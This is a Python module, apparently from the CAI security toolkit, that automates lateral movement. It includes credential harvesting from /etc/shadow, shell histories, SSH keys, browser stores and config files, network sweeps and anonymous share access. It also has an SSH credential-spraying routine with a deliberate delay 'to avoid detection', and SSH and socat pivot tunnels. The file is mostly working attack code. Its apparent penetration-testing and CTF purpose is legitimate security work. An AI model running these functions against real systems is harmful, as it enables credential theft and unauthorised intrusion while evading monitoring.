"""
Lateral Movement and Pivoting Toolkit for CAI

This module provides comprehensive lateral movement tools including
pivoting, tunneling, credential harvesting, and network propagation capabilities.
"""

import os
import re
import time
import json
import base64
import subprocess
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


def automated_lateral_movement(target_network: str = "192.168.1.0/24", ctf=None, **kwargs) -> str:
    """
    Perform automated lateral movement assessment
    
    Args:
        target_network: Target network range for lateral movement
        
    Returns:
        str: Detailed lateral movement assessment results
    """
    results = []
    results.append("=== Automated Lateral Movement Assessment ===")
    results.append(f"Target Network: {target_network}")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("")

    try:
        # 1. Credential Harvesting
        results.append("=== Credential Harvesting ===")
        cred_harvest = harvest_local_credentials(ctf=ctf)
        results.append(cred_harvest)
        results.append("")

        # 2. Network Discovery
        results.append("=== Internal Network Discovery ===")
        network_discovery = discover_internal_network(target_network, ctf=ctf)
        results.append(network_discovery)
        results.append("")

        # 3. Share Enumeration
        results.append("=== Network Share Enumeration ===")
        share_enum = enumerate_network_shares(target_network, ctf=ctf)
        results.append(share_enum)
        results.append("")

        # 4. Remote Access Opportunities
        results.append("=== Remote Access Assessment ===")
        remote_access = assess_remote_access(target_network, ctf=ctf)
        results.append(remote_access)
        results.append("")

        # 5. Pivoting Opportunities
        results.append("=== Pivoting Assessment ===")
        pivoting_assess = assess_pivoting_opportunities(ctf=ctf)
        results.append(pivoting_assess)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during lateral movement assessment: {str(e)}"


def harvest_local_credentials(ctf=None, **kwargs) -> str:
    """Harvest credentials from the local system"""
    results = []

    try:
        # Check for stored passwords in common locations
        password_locations = [
            "/home/*/.bash_history",
            "/home/*/.zsh_history",
            "/home/*/.mysql_history",
            "/home/*/.psql_history",
            "/var/log/auth.log",
            "/var/log/secure",
            "/etc/passwd",
            "/etc/shadow"
        ]

        results.append("Searching for credentials in common locations:")

        for location in password_locations:
            # Search for password-related patterns
            search_result = run_command(f"find {location} -type f -readable 2>/dev/null | head -5", ctf=ctf)
            if search_result.strip():
                results.append(f"\nFound readable files matching {location}:")
                results.append(search_result)

                # Look for passwords in these files
                password_search = run_command(
                    f"grep -i -E '(password|passwd|pwd|pass)' {location} 2>/dev/null | head -3", ctf=ctf)
                if password_search.strip():
                    results.append(f"🔥 Password patterns found:\n{password_search}")

        # Check for SSH keys
        ssh_keys = run_command("find /home -name 'id_*' -o -name '*.pem' -o -name '*.key' 2>/dev/null", ctf=ctf)
        if ssh_keys.strip():
            results.append(f"\n🔑 SSH keys found:\n{ssh_keys}")

        # Check browser saved passwords (if applicable)
        browser_paths = [
            "/home/*/.mozilla/firefox/*/logins.json",
            "/home/*/.config/google-chrome/Default/Login Data",
            "/home/*/.config/chromium/Default/Login Data"
        ]

        for browser_path in browser_paths:
            browser_check = run_command(f"find {browser_path} 2>/dev/null", ctf=ctf)
            if browser_check.strip():
                results.append(f"\n🌐 Browser credential store found: {browser_path}")

        # Check for database connection strings
        config_files = run_command(
            "find /var/www /opt /etc -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -10", ctf=ctf)
        if config_files.strip():
            results.append(f"\nConfiguration files to check for credentials:")
            for config_file in config_files.strip().split('\n')[:5]:
                if config_file.strip():
                    db_creds = run_command(f"grep -i -E '(user|pass|database|host).*=' {config_file} 2>/dev/null",
                                           ctf=ctf)
                    if db_creds.strip():
                        results.append(f"🔥 Database credentials in {config_file}:\n{db_creds}")

        # Memory dump analysis (if possible)
        memory_creds = run_command("ps aux | grep -E '(mysql|postgres|ssh|ftp)' | grep -v grep", ctf=ctf)
        if memory_creds.strip():
            results.append(f"\nDatabase/service processes (check for credentials in command line):\n{memory_creds}")

    except Exception as e:
        results.append(f"Error during credential harvesting: {str(e)}")

    return "\n".join(results)


def discover_internal_network(target_network: str, ctf=None, **kwargs) -> str:
    """Discover internal network topology and systems"""
    results = []

    try:
        # ARP table analysis
        arp_table = run_command("arp -a", ctf=ctf)
        results.append(f"ARP table (known hosts):\n{arp_table}")

        # Network interface analysis
        interfaces = run_command("ip addr show", ctf=ctf)
        results.append(f"\nNetwork interfaces:\n{interfaces}")

        # Routing table
        routes = run_command("ip route", ctf=ctf)
        results.append(f"\nRouting table:\n{routes}")

        # Ping sweep of target network
        ping_sweep = run_command(f"nmap -sn {target_network}", ctf=ctf)
        results.append(f"\nPing sweep results:\n{ping_sweep}")

        # Extract live hosts for further analysis
        live_hosts = re.findall(r'Nmap scan report for ([^\s]+)', ping_sweep)
        if live_hosts:
            results.append(f"\nDiscovered {len(live_hosts)} live hosts:")
            for host in live_hosts:
                results.append(f"  - {host}")

        # Port scan common services on discovered hosts
        if live_hosts:
            results.append(f"\nQuick port scan of discovered hosts:")
            for host in live_hosts[:3]:  # Scan first 3 hosts
                quick_scan = run_command(f"nmap -T4 -F {host}", ctf=ctf)
                open_ports = re.findall(r'(\d+)/tcp\s+open\s+([^\s]+)', quick_scan)
                if open_ports:
                    results.append(f"\n{host} - Open ports:")
                    for port, service in open_ports:
                        results.append(f"  {port}/tcp: {service}")

        # Check for domain information
        domain_info = run_command("cat /etc/resolv.conf", ctf=ctf)
        if domain_info.strip():
            results.append(f"\nDNS configuration:\n{domain_info}")

    except Exception as e:
        results.append(f"Error during network discovery: {str(e)}")

    return "\n".join(results)


def enumerate_network_shares(target_network: str, ctf=None, **kwargs) -> str:
    """Enumerate network shares and accessible resources"""
    results = []

    try:
        # Discover hosts first
        ping_sweep = run_command(f"nmap -sn {target_network}", ctf=ctf)
        live_hosts = re.findall(r'Nmap scan report for ([^\s]+)', ping_sweep)

        if not live_hosts:
            return "No live hosts found for share enumeration"

        results.append("Network share enumeration:")

        for host in live_hosts[:5]:  # Check first 5 hosts
            results.append(f"\n--- Checking {host} ---")

            # SMB share enumeration
            smb_shares = run_command(f"smbclient -N -L //{host} 2>/dev/null", ctf=ctf)
            if "Sharename" in smb_shares:
                results.append(f"🔥 SMB shares found:")
                results.append(smb_shares)

                # Try to access shares
                share_lines = re.findall(r'\s+(\w+)\s+Disk', smb_shares)
                for share in share_lines[:3]:  # Try first 3 shares
                    share_access = run_command(f"smbclient -N //{host}/{share} -c 'ls' 2>/dev/null", ctf=ctf)
                    if share_access.strip() and "NT_STATUS" not in share_access:
                        results.append(f"✓ Accessible share: {share}")
                        results.append(share_access[:300])  # Limit output

            # NFS share enumeration
            nfs_shares = run_command(f"showmount -e {host} 2>/dev/null", ctf=ctf)
            if nfs_shares.strip():
                results.append(f"🔥 NFS exports found:\n{nfs_shares}")

            # FTP anonymous access
            ftp_test = run_command(f"curl -s ftp://{host}/ --max-time 5", ctf=ctf)
            if ftp_test.strip() and "550" not in ftp_test:
                results.append(f"🔥 Anonymous FTP access: ftp://{host}/")

        # Local mounted shares
        mounted_shares = run_command("mount | grep -E '(cifs|nfs|smb)'", ctf=ctf)
        if mounted_shares.strip():
            results.append(f"\nCurrently mounted network shares:\n{mounted_shares}")

    except Exception as e:
        results.append(f"Error during share enumeration: {str(e)}")

    return "\n".join(results)


def assess_remote_access(target_network: str, ctf=None, **kwargs) -> str:
    """Assess remote access opportunities"""
    results = []

    try:
        # Discover hosts first
        ping_sweep = run_command(f"nmap -sn {target_network}", ctf=ctf)
        live_hosts = re.findall(r'Nmap scan report for ([^\s]+)', ping_sweep)

        if not live_hosts:
            return "No live hosts found for remote access assessment"

        results.append("Remote access opportunities:")

        # Common remote access ports
        remote_ports = {
            '22': 'SSH',
            '23': 'Telnet',
            '3389': 'RDP',
            '5900': 'VNC',
            '5985': 'WinRM HTTP',
            '5986': 'WinRM HTTPS',
            '1433': 'MS SQL',
            '3306': 'MySQL',
            '5432': 'PostgreSQL'
        }

        for host in live_hosts[:5]:  # Check first 5 hosts
            results.append(f"\n--- Remote access scan: {host} ---")

            # Scan for remote access ports
            port_list = ",".join(remote_ports.keys())
            remote_scan = run_command(f"nmap -p{port_list} {host}", ctf=ctf)

            for port, service in remote_ports.items():
                if f"{port}/tcp open" in remote_scan:
                    results.append(f"✓ {service} ({port}/tcp) is open")

                    # Service-specific checks
                    if port == '22':  # SSH
                        ssh_check = check_ssh_access(host, ctf=ctf)
                        results.append(ssh_check)
                    elif port == '3389':  # RDP
                        rdp_check = check_rdp_access(host, ctf=ctf)
                        results.append(rdp_check)
                    elif port == '23':  # Telnet
                        telnet_check = check_telnet_access(host, ctf=ctf)
                        results.append(telnet_check)

        # Check for web interfaces with default credentials
        web_scan = run_command(f"nmap -p80,443,8080,8443 --script http-default-accounts {target_network}", ctf=ctf)
        if "credentials" in web_scan.lower():
            results.append(f"\n🔥 Web interfaces with default credentials:\n{web_scan}")

    except Exception as e:
        results.append(f"Error during remote access assessment: {str(e)}")

    return "\n".join(results)


def check_ssh_access(host: str, ctf=None) -> str:
    """Check SSH access opportunities"""
    results = []

    try:
        # SSH version detection
        ssh_version = run_command(f"nmap -p22 --script ssh2-enum-algos {host}", ctf=ctf)
        results.append(f"SSH version info:\n{ssh_version}")

        # Common username enumeration
        common_users = ['admin', 'root', 'administrator', 'user', 'test', 'guest']
        results.append(f"\nTesting common usernames:")

        for username in common_users[:3]:  # Test first 3
            # Try to determine if username exists (timing attack)
            ssh_user_test = run_command(
                f"timeout 5 ssh -o ConnectTimeout=3 -o PreferredAuthentications=none {username}@{host} 2>&1", ctf=ctf)
            if "Permission denied" in ssh_user_test:
                results.append(f"  {username}: User may exist")

    except Exception as e:
        results.append(f"SSH check error: {str(e)}")

    return "\n".join(results)


def check_rdp_access(host: str, ctf=None) -> str:
    """Check RDP access opportunities"""
    results = []

    try:
        # RDP security check
        rdp_check = run_command(f"nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {host}", ctf=ctf)
        results.append(f"RDP security assessment:\n{rdp_check}")

        # Check for RDP vulnerabilities
        if "VULNERABLE" in rdp_check:
            results.append("🚨 RDP vulnerabilities detected!")

    except Exception as e:
        results.append(f"RDP check error: {str(e)}")

    return "\n".join(results)


def check_telnet_access(host: str, ctf=None) -> str:
    """Check Telnet access (high risk)"""
    results = []

    try:
        results.append("🚨 TELNET DETECTED - UNENCRYPTED PROTOCOL!")

        # Try to grab telnet banner
        telnet_banner = run_command(f"timeout 5 telnet {host} 23 2>/dev/null | head -5", ctf=ctf)
        if telnet_banner.strip():
            results.append(f"Telnet banner:\n{telnet_banner}")

    except Exception as e:
        results.append(f"Telnet check error: {str(e)}")

    return "\n".join(results)


def assess_pivoting_opportunities(ctf=None, **kwargs) -> str:
    """Assess opportunities for network pivoting"""
    results = []

    try:
        results.append("Pivoting opportunity assessment:")

        # Network interface analysis for multi-homed systems
        interfaces = run_command("ip addr show", ctf=ctf)
        interface_count = len(re.findall(r'inet ', interfaces))
        results.append(f"Network interfaces detected: {interface_count}")

        if interface_count > 2:  # More than loopback + 1 interface
            results.append("🔥 Multi-homed system detected - good pivoting candidate!")

        # Check for unusual network configurations
        routes = run_command("ip route", ctf=ctf)
        route_count = len(routes.strip().split('\n'))
        results.append(f"Routing table entries: {route_count}")

        # Check for active connections
        connections = run_command("netstat -an | grep ESTABLISHED", ctf=ctf)
        if connections.strip():
            results.append(f"\nActive network connections:\n{connections}")

            # Look for internal connections
            internal_connections = run_command("netstat -an | grep ESTABLISHED | grep -E '192\\.168\\.|10\\.|172\\.'",
                                               ctf=ctf)
            if internal_connections.strip():
                results.append(f"\n🔍 Internal network connections found:\n{internal_connections}")

        # Check for VPN connections
        vpn_check = run_command("ip link show | grep -E '(tun|tap|ppp)'", ctf=ctf)
        if vpn_check.strip():
            results.append(f"\n🔥 VPN interfaces detected:\n{vpn_check}")

        # Port forwarding opportunities
        forwarding_check = run_command("cat /proc/sys/net/ipv4/ip_forward", ctf=ctf)
        if forwarding_check.strip() == "1":
            results.append("\n🔥 IP forwarding is enabled - excellent pivoting host!")

        # Check for SSH agent forwarding
        ssh_agent = run_command("echo $SSH_AUTH_SOCK", ctf=ctf)
        if ssh_agent.strip():
            results.append(f"\n🔑 SSH agent detected: {ssh_agent}")

    except Exception as e:
        results.append(f"Error during pivoting assessment: {str(e)}")

    return "\n".join(results)


def setup_ssh_tunnel(local_port: int, remote_host: str, remote_port: int, ssh_host: str, ssh_user: str = "root",
                     ctf=None, **kwargs) -> str:
    """Set up SSH tunnel for pivoting"""
    results = []

    try:
        tunnel_cmd = f"ssh -L {local_port}:{remote_host}:{remote_port} {ssh_user}@{ssh_host} -N -f"
        results.append(f"Setting up SSH tunnel: {tunnel_cmd}")

        tunnel_result = run_command(tunnel_cmd, ctf=ctf)
        results.append(f"Tunnel setup result: {tunnel_result}")

        # Test tunnel
        test_result = run_command(f"netstat -an | grep :{local_port}", ctf=ctf)
        if test_result.strip():
            results.append(f"✓ Tunnel is active on port {local_port}")
            results.append(f"Access remote service via: localhost:{local_port}")
        else:
            results.append("⚠ Tunnel setup may have failed")

    except Exception as e:
        results.append(f"Error setting up SSH tunnel: {str(e)}")

    return "\n".join(results)


def setup_socat_relay(local_port: int, remote_host: str, remote_port: int, ctf=None, **kwargs) -> str:
    """Set up SOCAT relay for traffic forwarding"""
    results = []

    try:
        socat_cmd = f"socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port} &"
        results.append(f"Setting up SOCAT relay: {socat_cmd}")

        relay_result = run_command(socat_cmd, ctf=ctf)
        results.append(f"Relay setup result: {relay_result}")

        # Check if socat is running
        socat_check = run_command(f"ps aux | grep socat | grep {local_port}", ctf=ctf)
        if socat_check.strip():
            results.append(f"✓ SOCAT relay is active")
            results.append(f"Traffic to localhost:{local_port} will be forwarded to {remote_host}:{remote_port}")

    except Exception as e:
        results.append(f"Error setting up SOCAT relay: {str(e)}")

    return "\n".join(results)


def credential_spray_attack(target_network: str, username_list: List[str] = None, password_list: List[str] = None,
                            ctf=None, **kwargs) -> str:
    """Perform credential spraying attack across network"""
    results = []

    try:
        if not username_list:
            username_list = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'service']

        if not password_list:
            password_list = ['password', '123456', 'admin', 'root', '', 'Password1', 'welcome']

        results.append("=== Credential Spraying Attack ===")
        results.append(f"Target Network: {target_network}")
        results.append(f"Testing {len(username_list)} usernames with {len(password_list)} passwords")

        # Discover SSH hosts
        ssh_hosts = run_command(f"nmap -p22 --open {target_network} | grep 'Nmap scan report'", ctf=ctf)
        hosts = re.findall(r'Nmap scan report for ([^\s]+)', ssh_hosts)

        results.append(f"\nFound {len(hosts)} SSH hosts to test")

        successful_logins = []

        for host in hosts[:3]:  # Test first 3 hosts
            results.append(f"\nTesting {host}:")

            for username in username_list[:3]:  # Test first 3 usernames
                for password in password_list[:3]:  # Test first 3 passwords
                    # Use timeout to avoid hanging
                    ssh_test = run_command(
                        f"timeout 10 sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {username}@{host} 'echo SUCCESS' 2>/dev/null",
                        ctf=ctf)

                    if "SUCCESS" in ssh_test:
                        successful_logins.append(f"{host}:{username}:{password}")
                        results.append(f"🔥 SUCCESS: {username}@{host} with password '{password}'")

                    # Small delay to avoid detection
                    time.sleep(1)

        if successful_logins:
            results.append(f"\n🎯 Successful logins found:")
            for login in successful_logins:
                results.append(f"  - {login}")
        else:
            results.append("\nNo successful logins found with tested credentials")

    except Exception as e:
        results.append(f"Error during credential spraying: {str(e)}")

    return "\n".join(results)


def dump_network_configuration(ctf=None, **kwargs) -> str:
    """Dump detailed network configuration for lateral movement planning"""
    results = []

    try:
        results.append("=== Network Configuration Dump ===")

        # Network interfaces
        interfaces = run_command("ip addr show", ctf=ctf)
        results.append(f"Network Interfaces:\n{interfaces}")

        # Routing table
        routes = run_command("ip route show", ctf=ctf)
        results.append(f"\nRouting Table:\n{routes}")

        # ARP table
        arp = run_command("arp -a", ctf=ctf)
        results.append(f"\nARP Table:\n{arp}")

        # DNS configuration
        dns_config = run_command("cat /etc/resolv.conf", ctf=ctf)
        results.append(f"\nDNS Configuration:\n{dns_config}")

        # Active connections
        connections = run_command("netstat -antup", ctf=ctf)
        results.append(f"\nActive Connections:\n{connections}")

        # Firewall rules (if accessible)
        firewall = run_command("iptables -L 2>/dev/null || ufw status", ctf=ctf)
        if firewall.strip():
            results.append(f"\nFirewall Rules:\n{firewall}")

        # Network services
        services = run_command("systemctl list-units --type=service | grep -E '(ssh|ftp|http|smb|nfs)'", ctf=ctf)
        if services.strip():
            results.append(f"\nNetwork Services:\n{services}")

    except Exception as e:
        results.append(f"Error dumping network configuration: {str(e)}")

    return "\n".join(results)
